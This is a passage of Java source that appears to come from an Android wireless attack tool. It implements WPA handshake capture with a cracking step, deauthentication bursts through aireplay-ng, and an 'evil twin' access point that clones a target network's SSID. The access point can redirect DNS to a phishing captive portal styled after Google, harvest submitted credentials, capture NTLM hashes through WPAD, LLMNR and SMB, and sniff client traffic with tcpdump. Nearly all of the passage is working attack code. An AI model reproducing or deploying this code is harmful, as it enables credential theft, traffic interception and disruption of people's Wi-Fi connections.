                finally{try{file.delete();csv.delete();log.delete();directory.delete();}finally{restore();burst=null;}}}
        }}
        boolean detected=evidence.detected(reported);
        JSONObject result=new JSONObject().put("outcome",end).put("target",target).put("messages",evidence.exchange.messages).put("eapol_frames",evidence.eapol).put("pair_observed",evidence.exchange.pair)
            .put("capture_backend","airodump-ng").put("airodump_handshake_reported",reported).put("handshake_detected",detected).put("retained_eapol_frames",evidence.retainedEapol)
            .put("cryptographic_validation",false).put("station",evidence.exchange.station).put("restored",true).put("elapsed_ms",SystemClock.elapsedRealtime()-start)
            .put("pcap_base64",Base64.encodeToString(evidence.retained.toByteArray(),Base64.NO_WRAP)).put("partial",!detected);
        if(inline!=null)result.put("deauth",inline);
        if(detected&&!end.equals("cancelled")){
            JSONObject saved=rpc(new JSONObject().put("token",token).put("capture_checkpoint",result));
            if(!saved.optBoolean("ok"))throw new IOException("capture_checkpoint_failed");
            if(saved.optBoolean("cancel"))return result.put("quick_crack",new JSONObject().put("outcome","cancelled").put("partial",true).put("stop_reason","cancelled_before_quick"));
            // The radio has already been restored. A failed/cancelled quick check
            // is nested in the receipt and never discards the saved capture.
            JSONObject quick=new CrackJob(result,CrackStore.quick(),p->tick(p)).run();result.put("quick_crack",quick);
            if(quick.optBoolean("cryptographic_validation"))result.put("cryptographic_validation",true);
        }
        return result;
    }
    private static final class CaptureEvidence {
        final String bssid;final PcapTail tail;final WifiFrames.Exchange exchange=new WifiFrames.Exchange();
        final ByteArrayOutputStream retained=new ByteArrayOutputStream();int eapol,retainedEapol;boolean beacon,droppedEapol;
        CaptureEvidence(String bssid,PcapTail tail){this.bssid=bssid;this.tail=tail;}
        boolean detected(boolean reported){return reported&&retainedEapol>=2&&!droppedEapol;}
        void drain()throws Exception {tail.drain((packet,record)->{
            WifiFrames.Frame f=WifiFrames.decode(packet,tail.link);if(f==null||!f.bssid.equals(bssid))return;
            boolean keep=f.message>0||f.beacon&&!beacon;if(f.beacon)beacon=true;if(f.message>0)eapol++;
            // Export only the chosen AP's beacon and complete EAPOL frames,
            // never unrelated traffic or the native CSV/client inventory.
            if(keep&&retained.size()+record.length+24<120000){
                if(retained.size()==0)retained.write(tail.header);retained.write(record);
                if(f.message>0){retainedEapol++;f.receivedNanos=tail.timeNanos(record);exchange.add(f);}
            }else if(f.message>0)droppedEapol=true;
        });}
    }
    static boolean captureControlMatches(JSONObject control,String token,JSONObject args,long now,long elapsed)throws Exception {
        CoreEngine.keys(control,"id","capture_token","session","bssid","expires_elapsed_ms");CoreEngine.id(control,"id");
        return token.equals(control.optString("capture_token"))&&args.getString("session").equals(control.optString("session"))
            &&args.getString("bssid").equalsIgnoreCase(control.optString("bssid"))&&now<control.optLong("expires_elapsed_ms")&&elapsed<165000;
    }
    /** Separate guarded sender: it never owns or restores the capture interface. */
    private final class DeauthBurst {
        private final String id,bssid;private final File log=new File(BASE,"deauth.log");
        private java.lang.Process sender;private long start;private JSONObject result;
        DeauthBurst(String id,String bssid){this.id=id;this.bssid=bssid;}
        synchronized void begin()throws Exception {
            if(closing)throw new InterruptedException("worker_stopping");
            present();File executable=new File(BASE,"aireplay-ng");if(!executable.canExecute())throw new IOException("injection_tool_missing");
            ProcessBuilder pb=new ProcessBuilder(BASE+"/radio-guard","10",executable.getPath(),"--deauth","1","-a",bssid,"--ignore-negative-one",iface);
            pb.environment().put("PATH","/data/lambda-op:/system/bin:/system/xbin:/vendor/bin");
            if(kind.equals("internal"))pb.environment().put("LD_PRELOAD",LIB);
            pb.redirectErrorStream(true).redirectOutput(log);start=SystemClock.elapsedRealtime();sender=pb.start();
        }
        synchronized JSONObject poll()throws Exception {
            if(result!=null)return result;
            if(sender==null)return finish("failed");
            if(!sender.isAlive())return finish(null);
            if(SystemClock.elapsedRealtime()-start>=10000)return finish("deadline");
            return new JSONObject().put("id",id).put("outcome","sending").put("cycles",1).put("transmission_reported",false).put("effect_verified",false);
        }
        synchronized JSONObject finish(String reason)throws Exception {
            if(result!=null)return result;
            boolean alive=sender!=null&&sender.isAlive();int code=sender!=null&&!alive?sender.exitValue():-1;
            if(alive){sender.destroy();if(!sender.waitFor(1500,TimeUnit.MILLISECONDS)){sender.destroyForcibly();sender.waitFor(1000,TimeUnit.MILLISECONDS);}}
            String output=sender==null?"":read(log.getPath());
            boolean reported=code==0&&(output.contains("Sending DeAuth")||output.contains("Sending 64 directed DeAuth"));
            result=new JSONObject().put("id",id).put("outcome",sender==null?"not_started":alive&&reason!=null?reason:code==124?"deadline":reported?"transmission_reported":"not_verified")
                .put("cycles",1).put("elapsed_ms",start==0?0:SystemClock.elapsedRealtime()-start).put("exit_code",code)
                .put("transmission_reported",reported).put("effect_verified",false).put("tool_output",output.substring(0,Math.min(2000,output.length())));
            return result;
        }
    }
    private JSONObject deauth(JSONObject args)throws Exception {
        CoreEngine.keys(args,"session","bssid","authorized");
        if(!args.getBoolean("authorized")||session==null||!session.equals(args.getString("session"))||!changed||SystemClock.elapsedRealtime()>lease)throw new IOException("scan_session_expired");
        String bssid=args.getString("bssid").toLowerCase(Locale.US);JSONObject target=networks.get(bssid);
        if(target==null)throw new IOException("network_not_in_scan");
        channel(target.getInt("channel"));burst=new DeauthBurst(UUID.randomUUID().toString(),bssid);
        boolean cancelled=false;long start=SystemClock.elapsedRealtime();JSONObject report=null;
        try {
            tick(new JSONObject().put("phase","deauth").put("target",target).put("seconds",0));burst.begin();
            while(burst.poll().optString("outcome").equals("sending")){present();tick(new JSONObject().put("phase","deauth").put("target",target).put("seconds",(SystemClock.elapsedRealtime()-start)/1000));Thread.sleep(400);}
        }catch(InterruptedException e){cancelled=true;}
        finally{try{report=burst.finish(cancelled?"cancelled":null);}finally{restore();burst=null;}}
        return report.put("target",target).put("elapsed_ms",SystemClock.elapsedRealtime()-start).put("restored",true).put("partial",true);
    }
    /** Same adapter, different role: stop monitor/managed and start an open clone AP.
     *  Internal dhd rejects arbitrary MAC changes, so SSID and channel are cloned;
     *  BSSID cloning is not attempted on the internal radio. */
    private void prepareAp(int ch)throws Exception {
        if(iface==null||ifindex==null||!ifindex.equals(read("/sys/class/net/"+iface+"/ifindex")))throw new IOException("adapter_disconnected");
        if(kind.equals("internal")&&monitor)try{nex("-m0");}catch(Exception ignored){}
        if(kind.equals("internal")){
            // The virtual AP interface needs the phy awake, and keeping wlan0
            // as a STA is what makes the upstream path possible. This is also
            // the only path that lets dhd accept a cloned AP MAC: setting it
            // after svc wifi disable fails while the bus is suspended.
            cmd("/system/bin/ip","link","set",iface,"down");
            cmd("/system/bin/iw","dev",iface,"set","type","managed");
            cmd("/system/bin/svc","wifi","enable");
            for(int n=0;n<20&&!cmd("/system/bin/settings","get","global","wifi_on").trim().equals("1");n++)Thread.sleep(500);
            for(int n=0;n<20&&!new File("/sys/class/net/"+iface).exists();n++)Thread.sleep(500);
            cmd("/system/bin/ip","link","set",iface,"up");
            String phy=new File("/sys/class/net/"+iface+"/phy80211").getCanonicalFile().getName();
            if(new File("/sys/class/net/ap0").exists())try{cmd("/system/bin/iw","dev","ap0","del");}catch(Exception ignored){}
            cmd("/system/bin/iw","phy",phy,"interface","add","ap0","type","managed");
            apIface="ap0";
        }else{
            apIface=iface;
            originalMac=read("/sys/class/net/"+iface+"/address");
            cmd("/system/bin/ip","link","set",iface,"down");
            cmd("/system/bin/iw","dev",iface,"set","type","managed");
        }
        cmd("/system/bin/ip","link","set",apIface,"up");
        JSONObject journal=new JSONObject().put("iface",iface).put("ifindex",ifindex).put("kind",kind).put("type",originalType).put("wifi",originalWifi).put("up",originalUp).put("monitor",false).put("ap",apIface).put("mac",originalMac==null?"":originalMac);
        try(FileOutputStream out=new FileOutputStream(new File(BASE,"restore.json"))){out.write(journal.toString().getBytes(StandardCharsets.UTF_8));out.getFD().sync();}
        changed=true;monitor=false;lease=SystemClock.elapsedRealtime()+360000;session=UUID.randomUUID().toString();
        tick(new JSONObject().put("phase","ap_starting").put("adapter",kind).put("channel",ch));
    }
    /** Manual AP: no survey and no monitor transition; the STA link stays as
     *  it is, which is also the coolest way to run the AP. */
    private void prepareApManual(int ch)throws Exception {
        kind="internal";iface="wlan0";ifindex=read("/sys/class/net/"+iface+"/ifindex");
        if(ifindex==null||ifindex.isEmpty())throw new IOException("adapter_disconnected");
        originalType=match(cmd("/system/bin/iw","dev",iface,"info"),"(?m)^\\s*type (\\w+)");
        if(!originalType.equals("managed")){cmd("/system/bin/ip","link","set",iface,"down");cmd("/system/bin/iw","dev",iface,"set","type","managed");originalType="managed";}
        originalWifi=cmd("/system/bin/settings","get","global","wifi_on").trim().equals("1");
        originalUp=(Long.decode(read("/sys/class/net/"+iface+"/flags"))&1)!=0;
        cmd("/system/bin/svc","wifi","enable");
        for(int n=0;n<12&&!cmd("/system/bin/settings","get","global","wifi_on").trim().equals("1");n++)Thread.sleep(500);
        for(int n=0;n<12&&!new File("/sys/class/net/"+iface).exists();n++)Thread.sleep(500);
        cmd("/system/bin/ip","link","set",iface,"up");
        String phy=new File("/sys/class/net/"+iface+"/phy80211").getCanonicalFile().getName();
        if(new File("/sys/class/net/ap0").exists())try{cmd("/system/bin/iw","dev","ap0","del");}catch(Exception ignored){}
        cmd("/system/bin/iw","phy",phy,"interface","add","ap0","type","managed");
        apIface="ap0";
        // dhd ignores a per-vif MAC change for the data path: beaconing with a
        // custom MAC works, but AP-to-client frames never arrive. Always use
        // the driver's own address on the internal radio.
        cmd("/system/bin/ip","link","set",apIface,"up");
        JSONObject journal=new JSONObject().put("iface",iface).put("ifindex",ifindex).put("kind",kind).put("type",originalType).put("wifi",originalWifi).put("up",originalUp).put("monitor",false).put("ap",apIface).put("mac","");
        try(FileOutputStream out=new FileOutputStream(new File(BASE,"restore.json"))){out.write(journal.toString().getBytes(StandardCharsets.UTF_8));out.getFD().sync();}
        changed=true;monitor=false;lease=SystemClock.elapsedRealtime()+360000;session=UUID.randomUUID().toString();
        tick(new JSONObject().put("phase","ap_starting").put("adapter",kind).put("channel",ch));
    }
    private static String randomBssid(){
        java.security.SecureRandom random=new java.security.SecureRandom();byte[] b=new byte[6];random.nextBytes(b);
        b[0]=0x02;return String.format(Locale.US,"%02x:%02x:%02x:%02x:%02x:%02x",b[0]&255,b[1]&255,b[2]&255,b[3]&255,b[4]&255,b[5]&255);
    }
    private String detectUpstream(){
        try{
            String dev=match(cmd("/system/bin/ip","route","get","1.1.1.1"),"dev ([a-zA-Z0-9_.-]+)");
            if(dev.isEmpty()||dev.equals(apIface)||!new File("/sys/class/net/"+dev).exists())return null;
            return dev;
        }catch(Exception e){return null;}
    }
    private void startNat(String upstream)throws Exception {
        if(!upstream.matches("[a-zA-Z0-9_.-]{1,15}")||!new File("/sys/class/net/"+upstream).exists()||upstream.equals(apIface))throw new IOException("invalid_upstream");
        upstreamIface=upstream;
        ipForwardPrev=read("/proc/sys/net/ipv4/ip_forward").equals("1")?1:0;
        writePlain("/proc/sys/net/ipv4/ip_forward","1");
        cmd("/system/bin/iptables","-t","nat","-A","POSTROUTING","-o",upstream,"-j","MASQUERADE");
        // Insert before netd's oem_fwd/fw_FORWARD chains: they can drop
        // traffic from an interface netd does not manage (ap0).
        cmd("/system/bin/iptables","-I","FORWARD","1","-i",apIface,"-o",upstream,"-j","ACCEPT");
        cmd("/system/bin/iptables","-I","FORWARD","1","-i",upstream,"-o",apIface,"-m","state","--state","RELATED,ESTABLISHED","-j","ACCEPT");
        // Client traffic must use the upstream table: Android's main table has
        // no default route, and its last rule is "from all unreachable".
        try{cmd("/system/bin/ip","rule","add","from","192.168.50.0/24","lookup",upstream,"pref","8997");}catch(Exception ignored){}
        tick(new JSONObject().put("phase","ap_starting").put("upstream",upstream));
    }
    private void stopNat(){
        if(upstreamIface==null)return;
        try{cmd("/system/bin/ip","rule","del","pref","8997");}catch(Exception ignored){}
        try{cmd("/system/bin/iptables","-t","nat","-D","POSTROUTING","-o",upstreamIface,"-j","MASQUERADE");}catch(Exception ignored){}
        try{cmd("/system/bin/iptables","-D","FORWARD","-i",apIface,"-o",upstreamIface,"-j","ACCEPT");}catch(Exception ignored){}
        try{cmd("/system/bin/iptables","-D","FORWARD","-i",upstreamIface,"-o",apIface,"-m","state","--state","RELATED,ESTABLISHED","-j","ACCEPT");}catch(Exception ignored){}
        if(ipForwardPrev>=0)try{writePlain("/proc/sys/net/ipv4/ip_forward",Integer.toString(ipForwardPrev));}catch(Exception ignored){}
        upstreamIface=null;ipForwardPrev=-1;
    }
    private JSONObject evilTwin(JSONObject a)throws Exception {
        boolean manual=a.optString("mode","clone").equals("manual"),snapshot=a.optBoolean("snapshot_clone",false);
        String bssid,ssid,security,passphrase;int ch;
        int seconds=a.has("seconds")?a.getInt("seconds"):0;if(seconds!=0&&(seconds<30||seconds>86400))throw new IOException("invalid_ap_seconds");
        boolean sniff=a.optBoolean("sniff",true),portal=a.optBoolean("portal",false),upstream=a.optBoolean("upstream",true),ntlmCapture=a.optBoolean("ntlm",false);
        String portalTemplate=a.optString("portal_template","google");if(!portalTemplate.matches("[a-z0-9_-]{1,20}"))throw new IOException("invalid_portal_template");
        if(manual){
            CoreEngine.keys(a,"mode","ssid","passphrase","security","channel","authorized","seconds","sniff","portal","portal_template","upstream","ntlm");
            if(!a.getBoolean("authorized"))throw new IOException("target_authorization_required");
            ssid=a.getString("ssid");security=a.optString("security","open");passphrase=a.optString("passphrase","");
            ch=a.has("channel")?a.getInt("channel"):1+(int)(Math.random()*13);
            bssid="";
        }else if(snapshot){
            CoreEngine.keys(a,"snapshot_clone","ssid","channel","bssid","seconds","sniff","portal","portal_template","upstream","ntlm");
            ssid=a.getString("ssid");ch=a.getInt("channel");bssid=a.getString("bssid").toLowerCase(Locale.US);security="open";passphrase="";
        }else{
            CoreEngine.keys(a,"session","bssid","authorized","seconds","sniff","portal","portal_template","upstream","ntlm");
            if(!a.getBoolean("authorized")||session==null||!session.equals(a.getString("session"))||!changed||SystemClock.elapsedRealtime()>lease)throw new IOException("scan_session_expired");
            bssid=a.getString("bssid").toLowerCase(Locale.US);JSONObject target=networks.get(bssid);
            if(target==null)throw new IOException("network_not_in_scan");
            ssid=target.optString("ssid");security="open";passphrase="";ch=target.getInt("channel");
        }
        if(ssid.isEmpty()||ssid.indexOf('\n')>=0||ssid.indexOf('\0')>=0||ssid.getBytes(StandardCharsets.UTF_8).length>32)throw new IOException("invalid_ssid");
        if(manual)prepareApManual(ch);else prepareAp(ch);
        String useKind=kind;
        // Wi-Fi was in monitor during the survey; wait for the STA link to come
        // back before asking for a default route. No route means AP without NAT.
        String upstreamDev=null;
        if(upstream)for(int n=0;n<20&&upstreamDev==null;n++){upstreamDev=detectUpstream();if(upstreamDev==null)Thread.sleep(500);}
        boolean upstreamActive=upstreamDev!=null;
        // hostapd runs as uid wifi, not root: it cannot traverse the 0700 worker
        // directory. Keep only its config in a traversable directory.
        File apDir=new File("/data/local/tmp/lambda-ap");
        if(!apDir.isDirectory()&&!apDir.mkdir())throw new IOException("ap_directory_unavailable");
        apDir.setReadable(true,false);apDir.setExecutable(true,false);
        File conf=new File(apDir,"hostapd.conf"),dnsConf=new File(BASE,"ap-dnsmasq.conf"),hostapdLog=new File(BASE,"ap-hostapd.log"),dnsLog=new File(BASE,"ap-dnsmasq.log");
        File ntlmScript=new File(BASE,"ntlm-capture.py"),ntlmLog=new File(BASE,"ntlm-capture.log"),ntlmFile=new File(BASE,"ntlm-captures.jsonl");
        File deny=new File(apDir,"deny.txt");write(deny,"");deny.setReadable(true,false);
        ArrayList<File> pcaps=new ArrayList<>();File pcap=new File(BASE,"ap-sniff-0.pcap");pcaps.add(pcap);
        java.lang.Process ap=null,dns=null,sniffer=null,raProc=null,ntlmProc=null;long start=SystemClock.elapsedRealtime();String outcome="completed";boolean ipv6=false;
        LinkedHashMap<String,JSONObject> stations=new LinkedHashMap<>();LinkedHashSet<String> banned=new LinkedHashSet<>();JSONArray events=new JSONArray();
        JSONArray credentials=new JSONArray();PortalServer portalServer=null;
        String bigZone=null;for(File z:new File("/sys/class/thermal").listFiles())if(read(z.getPath()+"/type").equals("BIG")){bigZone=z.getPath()+"/temp";break;}
        int liveClients=0,ntlmSeen=0;String ackId="";int ackTicks=0;int segment=0;boolean portalReleased=false;
        try {
            // WMM and HT keep the AP at modern rates; without them the client
            // falls back to legacy 11g and browsing becomes painfully slow.
            StringBuilder hc=new StringBuilder("interface="+apIface+"\ndriver=nl80211\nssid="+ssid+"\nhw_mode=g\nchannel="+ch+"\nwmm_enabled=1\nieee80211n=1\nht_capab=[SHORT-GI-20]\nauth_algs=1\nignore_broadcast_ssid=0\nmacaddr_acl=0\ndeny_mac_file="+deny.getPath()+"\n");
            if(!security.equals("open")){
                hc.append("wpa=2\nwpa_passphrase=").append(passphrase).append("\nrsn_pairwise=CCMP\n");
                if(security.equals("wpa3"))hc.append("wpa_key_mgmt=SAE\nieee80211w=2\n");
                else if(security.equals("mixed"))hc.append("wpa_key_mgmt=WPA-PSK SAE\nieee80211w=1\n");
                else hc.append("wpa_key_mgmt=WPA-PSK\nieee80211w=1\n");
            }
            write(conf,hc.toString());
            conf.setReadable(true,false);
            ap=new ProcessBuilder("/vendor/bin/hw/hostapd",conf.getPath()).redirectErrorStream(true).redirectOutput(hostapdLog).start();
            long deadline=SystemClock.elapsedRealtime()+12000;boolean ready=false;
            while(SystemClock.elapsedRealtime()<deadline){if(!ap.isAlive())break;if(cmd("/system/bin/iw","dev",apIface,"info").contains("type AP")){ready=true;break;}Thread.sleep(400);}
            if(!ready){
                try{write(hostapdLog,cmd("/system/bin/logcat","-d","-t","80","-s","hostapd"));}catch(Exception ignored){}
                throw new IOException("ap_start_failed");
            }
            String actualMac=match(cmd("/system/bin/iw","dev",apIface,"info"),"(?m)^\\s*addr\\s+([0-9a-fA-F:]{17})");
            bssid=actualMac.toLowerCase(Locale.US);
            cmd("/system/bin/ip","addr","add","192.168.50.1/24","dev",apIface);
            // Android policy routing sends root/uid-0 traffic through the
            // wlan0 table, so DHCP replies aimed at the AP subnet would leave
            // through wlan0 and never reach the client. Pin the AP subnet and
            // the broadcast address to the main table, where ap0 lives.
            try{cmd("/system/bin/ip","route","add","255.255.255.255","dev",apIface,"table","main");}catch(Exception ignored){}
            // Android ends its rule list with "from all unreachable", so
            // forwarded client traffic never reaches main without this rule.
            try{cmd("/system/bin/ip","rule","add","iif",apIface,"lookup","main","pref","8999");}catch(Exception ignored){}
            try{cmd("/system/bin/ip","rule","add","to","192.168.50.0/24","lookup","main","pref","8996");}catch(Exception ignored){}
            try{cmd("/system/bin/ip","rule","add","to","255.255.255.255/32","lookup","main","pref","9001");}catch(Exception ignored){}
            // netd firewall can drop traffic from an interface it does not manage;
            // the portal and DNS live on this phone, so pin INPUT/OUTPUT too.
            try{cmd("/system/bin/iptables","-I","INPUT","1","-i",apIface,"-j","ACCEPT");}catch(Exception ignored){}
            try{cmd("/system/bin/iptables","-I","OUTPUT","1","-o",apIface,"-j","ACCEPT");}catch(Exception ignored){}
            if(upstreamActive)startNat(upstreamDev);
            String dnsConfText="interface="+apIface+"\nbind-interfaces\ndhcp-range=192.168.50.10,192.168.50.100,12h\ndhcp-option=3,192.168.50.1\ndhcp-option=6,192.168.50.1\nno-resolv\nlog-queries\nlog-dhcp\n";
            if(portal)dnsConfText+="address=/#/192.168.50.1\nno-resolv\ndhcp-option=114,http://192.168.50.1/\n";
            else if(upstreamActive)dnsConfText+="server=1.1.1.1\nserver=8.8.8.8\n";
            // WPAD via DHCP, on its own port so the captive portal keeps 80.
            if(ntlmCapture)dnsConfText+="dhcp-option=252,http://192.168.50.1:8079/wpad.dat\n";
            // Android clients commonly drop a unicast OFFER before they own an
            // address; force broadcast replies for this AP interface.
            dnsConfText+="dhcp-broadcast=tag:"+apIface+"\n";
            write(dnsConf,dnsConfText);
            dns=new ProcessBuilder("/system/bin/dnsmasq","-C",dnsConf.getPath(),"--no-daemon").redirectErrorStream(true).redirectOutput(dnsLog).start();
            Thread.sleep(800);if(!dns.isAlive())throw new IOException("ap_dhcp_failed");
            if(portal){
                try{portalServer=new PortalServer("192.168.50.1",portalTemplate,credentials,events,ntlmCapture);event(events,"portal "+portalTemplate+t(" activo"," active"));}
                catch(Exception e){throw new IOException("portal_start_failed");}
            }
            File ra=new File(BASE,"ra-sender.py");String py="/data/local/tmp/lambda-wps/usr/bin/python3";
            if(ntlmCapture&&ntlmScript.isFile()&&new File(py).canExecute()){
                ntlmFile.delete();
                ProcessBuilder nb=new ProcessBuilder(py,ntlmScript.getPath(),apIface,"192.168.50.1",ntlmFile.getPath());
                nb.environment().put("PATH","/data/local/tmp/lambda-wps/usr/bin:/system/bin");
                nb.environment().put("LD_LIBRARY_PATH","/data/local/tmp/lambda-wps/usr/lib");
                nb.environment().put("HOME","/data/local/tmp/lambda-wps/home");
                nb.redirectErrorStream(true).redirectOutput(ntlmLog);
                ntlmProc=nb.start();Thread.sleep(600);
                event(events,ntlmProc.isAlive()?t("captura NTLM activa (WPAD, SMB, LLMNR)","NTLM capture active (WPAD, SMB, LLMNR)"):t("la captura NTLM no arrancó","NTLM capture did not start"));
            }else if(ntlmCapture)event(events,t("script de captura NTLM no desplegado","NTLM capture script not deployed"));
            if(ra.isFile()&&new File(py).canExecute()){
                try{
                    writePlain("/proc/sys/net/ipv6/conf/"+apIface+"/disable_ipv6","0");
                    cmd("/system/bin/ip","-6","addr","add","fd50::1/64","dev",apIface);
                    // RA needs the autoconfigured link-local; give DAD a moment.
                    for(int n=0;n<8&&!cmd("/system/bin/ip","-6","addr","show",apIface).contains("fe80");n++)Thread.sleep(500);
                    ipv6=cmd("/system/bin/ip","-6","addr","show",apIface).contains("fe80");
                }catch(Exception ignored){}
                if(ipv6){
                    ProcessBuilder rb=new ProcessBuilder(py,ra.getPath(),apIface,"fd50::");
                    rb.environment().put("PATH","/data/local/tmp/lambda-wps/usr/bin:/system/bin");
                    rb.environment().put("LD_LIBRARY_PATH","/data/local/tmp/lambda-wps/usr/lib");
                    rb.environment().put("HOME","/data/local/tmp/lambda-wps/home");
                    rb.redirectErrorStream(true).redirectOutput(new File(BASE,"ra-sender.log"));
                    raProc=rb.start();
                }
            }
            if(sniff){sniffer=new ProcessBuilder(BASE+"/radio-guard","600","/system/bin/tcpdump","-i",apIface,"-U","-n","-s","128","-w",pcap.getPath()).redirectErrorStream(true).redirectOutput(new File(BASE,"ap-sniff.log")).start();Thread.sleep(300);if(!sniffer.isAlive())throw new IOException("ap_sniff_failed");}
            while(true){
                long elapsed=(SystemClock.elapsedRealtime()-start)/1000;
                if(seconds>0&&elapsed>=seconds){outcome="deadline";break;}
                present();if(!ap.isAlive())throw new IOException("ap_process_exited");
                LinkedHashSet<String> current=new LinkedHashSet<>();
                try{Matcher sm=Pattern.compile("Station ([0-9a-fA-F:]{17})").matcher(cmd("/system/bin/iw","dev",apIface,"station","dump"));while(sm.find())current.add(sm.group(1).toLowerCase(Locale.US));}catch(Exception ignored){}
                HashMap<String,String[]> dhcp=leases(dnsLog);
                if(ntlmCapture)ntlmSeen=ntlmCaptures(ntlmFile,credentials,events,ntlmSeen);
                for(String mac:new ArrayList<>(stations.keySet()))if(!current.contains(mac)){JSONObject gone=stations.remove(mac);event(events,(gone!=null&&!gone.optString("name","").isEmpty()?gone.optString("name"):mac)+t(" se ha desconectado"," left"));}
                // A station only counts as a client once DHCP gave it an IP;
                // association alone is not a usable connection.
                for(String mac:current){
                    String[] lease=dhcp.get(mac);if(lease==null)continue;
                    JSONObject known=stations.get(mac);
                    if(known==null){stations.put(mac,new JSONObject().put("mac",mac).put("ip",lease[0]).put("name",lease[1]).put("since",System.currentTimeMillis()));
                        event(events,(!lease[1].isEmpty()?lease[1]:mac)+t(" conectado ("," connected (")+lease[0]+")");}
                    else if(!known.optString("ip").equals(lease[0]))known.put("ip",lease[0]).put("name",lease[1]);
                }
                liveClients=stations.size();
                if(portal&&!portalReleased){
                    // Only a portal form post releases the DNS; a captured
                    // NTLM hash must not open the client's internet.
                    boolean portalPosted=false;
                    for(int i=0;i<credentials.length();i++){JSONObject c=credentials.optJSONObject(i);if(c!=null&&c.optString("kind","").isEmpty()&&!c.optString("data","").isEmpty()){portalPosted=true;break;}}
                    if(portalPosted){
                    // A real portal "logs the client in": swap the captive DNS
                    // for the upstream resolvers so the client gets internet.
                    portalReleased=true;
                    StringBuilder released=new StringBuilder("interface="+apIface+"\nbind-interfaces\ndhcp-range=192.168.50.10,192.168.50.100,12h\ndhcp-option=3,192.168.50.1\ndhcp-option=6,192.168.50.1\nlog-queries\nlog-dhcp\ndhcp-broadcast=tag:"+apIface+"\n");
                    if(upstreamActive)released.append("server=1.1.1.1\nserver=8.8.8.8\n");else released.append("no-resolv\n");
                    if(ntlmCapture)released.append("dhcp-option=252,http://192.168.50.1:8079/wpad.dat\n");
                    write(dnsConf,released.toString());
                    stopQuietly(dns);
                    dns=new ProcessBuilder("/system/bin/dnsmasq","-C",dnsConf.getPath(),"--no-daemon").redirectErrorStream(true).redirectOutput(dnsLog).start();
                    event(events,t("portal superado; Internet liberado","portal passed; Internet released"));
                    }
                }
                int temp=0;try{temp=bigZone==null?0:Integer.parseInt(read(bigZone).trim());}catch(Exception ignored){}
                if(temp>=78000){outcome="thermal_stop";event(events,t("Temperatura crítica; AP detenido","Critical temperature; AP stopped"));break;}
                if(sniff&&!sniffer.isAlive()){
                    // radio-guard bounds each segment; rotate files so an
                    // unlimited session keeps capturing.
                    pcap=new File(BASE,"ap-sniff-"+(++segment)+".pcap");pcaps.add(pcap);
                    sniffer=new ProcessBuilder(BASE+"/radio-guard","600","/system/bin/tcpdump","-i",apIface,"-U","-n","-s","128","-w",pcap.getPath()).redirectErrorStream(true).redirectOutput(new File(BASE,"ap-sniff.log")).start();
                }
                JSONArray stationRows=new JSONArray();for(JSONObject s:stations.values())stationRows.put(s);
                JSONObject progress=new JSONObject().put("phase","ap").put("seconds",elapsed).put("ssid",ssid).put("bssid",bssid).put("mode",manual?"manual":"clone").put("security",security).put("channel",ch).put("adapter",useKind)
                    .put("clients",liveClients).put("stations",stationRows).put("banned",new JSONArray(new ArrayList<>(banned))).put("events",events).put("temp",temp)
                    .put("credentials",credentials).put("portal_template",portal?portalTemplate:"").put("portal_released",portalReleased).put("ntlm",ntlmCapture)
                    .put("sniff",sniff).put("portal",portal).put("ipv6",ipv6).put("upstream",upstream).put("upstream_active",upstreamActive).put("upstream_iface",upstreamIface==null?"":upstreamIface);
                if(sniff){long total=0;for(File f:pcaps)total+=packets(f);progress.put("packets",(int)Math.min(total,200000));}
                if(ackTicks>0){progress.put("ap_control_ack",ackId);ackTicks--;}
                JSONObject control=tick(progress).optJSONObject("ap_control");
                if(control!=null){
                    CoreEngine.keys(control,"id","action","mac","expires_elapsed_ms","caller_uid","requested_ms");
                    String action=control.getString("action"),mac=control.getString("mac").toLowerCase(Locale.US);
                    if(SystemClock.elapsedRealtime()<control.optLong("expires_elapsed_ms")){
                        if(action.equals("kick")){
                            try{cmd("/system/bin/iw","dev",apIface,"station","del",mac);}catch(Exception ignored){}
                            JSONObject kicked=stations.remove(mac);
                            event(events,((kicked!=null&&!kicked.optString("name","").isEmpty())?kicked.optString("name"):mac)+t(" expulsado"," kicked"));
                        }else{
                            // Bans are enforced by hostapd's deny_mac_file: a
                            // kick alone lets the client reassociate at once.
                            if(action.equals("ban"))banned.add(mac);else banned.remove(mac);
                            StringBuilder list=new StringBuilder();for(String b:banned)list.append(b).append('\n');
                            write(deny,list.toString());
                            JSONObject kicked=stations.remove(mac);
                            event(events,((kicked!=null&&!kicked.optString("name","").isEmpty())?kicked.optString("name"):mac)+(action.equals("ban")?t(" baneado"," banned"):t(" desbaneado"," unbanned")));
                            if(action.equals("ban"))try{cmd("/system/bin/iw","dev",apIface,"station","del",mac);}catch(Exception ignored){}
                            // Reload hostapd so the ACL change takes effect.
                            stopQuietly(ap);
                            ap=new ProcessBuilder("/vendor/bin/hw/hostapd",conf.getPath()).redirectErrorStream(true).redirectOutput(hostapdLog).start();
                            long aclReady=SystemClock.elapsedRealtime()+12000;
                            while(SystemClock.elapsedRealtime()<aclReady){if(cmd("/system/bin/iw","dev",apIface,"info").contains("type AP"))break;Thread.sleep(400);}
                        }
                        ackId=CoreEngine.id(control,"id");ackTicks=5;
                    }
                }
                Thread.sleep(900);
            }
        }catch(InterruptedException e){outcome="cancelled";}
        finally {
            if(portalServer!=null)portalServer.close();
            stopQuietly(ntlmProc);stopQuietly(raProc);stopQuietly(sniffer);stopQuietly(dns);stopQuietly(ap);
            try{cmd("/system/bin/ip","-6","addr","del","fd50::1/64","dev",apIface);}catch(Exception ignored){}
            try{cmd("/system/bin/ip","addr","del","192.168.50.1/24","dev",apIface);}catch(Exception ignored){}
            try{restore();}catch(Exception e){outcome="restore_failed: "+e.getMessage();}
            conf.delete();apDir.delete();dnsConf.delete();
        }
        long bytes=sniff?totalBytes(pcaps):0;int counted=sniff?totalPackets(pcaps):0;
        JSONObject result=new JSONObject().put("outcome",outcome).put("ssid",ssid).put("bssid",bssid).put("channel",ch).put("adapter",useKind)
            .put("mode",manual?"manual":"clone").put("security",security)
            .put("seconds",(SystemClock.elapsedRealtime()-start)/1000).put("clients",liveClients).put("packets",counted).put("pcap_bytes",bytes)
            .put("events",events).put("banned",new JSONArray(new ArrayList<>(banned))).put("credentials",credentials).put("portal_released",portalReleased).put("ntlm",ntlmCapture)
            .put("sniff",sniff).put("portal",portal).put("portal_template",portal?portalTemplate:"").put("ipv6",ipv6).put("upstream",upstream).put("upstream_active",upstreamActive).put("upstream_iface",upstreamDev==null?"":upstreamDev)
            .put("restored",!outcome.startsWith("restore_failed")).put("partial",!outcome.equals("deadline"))
